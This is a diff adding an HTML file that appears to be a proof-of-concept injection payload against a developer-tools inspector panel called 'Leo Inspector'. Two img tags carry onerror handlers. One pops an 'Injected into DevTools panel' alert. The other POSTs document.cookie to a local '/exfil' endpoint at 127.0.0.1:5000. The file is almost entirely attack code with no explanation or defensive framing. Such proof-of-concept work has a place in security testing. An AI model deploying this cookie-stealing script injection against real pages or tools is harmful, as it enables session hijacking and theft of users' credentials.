@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body>
+<style>
+body { background:black; color:#0f0; font-size:16px; }
+</style>
+
+<h1>Leo Inspector Compromised</h1>
+
+<img src=x onerror="alert('Injected into DevTools panel')">
+<h1 style="color:red">INJECTED</h1>
+
+<img src=x onerror="
+fetch('http://127.0.0.1:5000/exfil', {
+  method: 'POST',
+  body: document.cookie
+})
+">
+
+</body>
+</html>
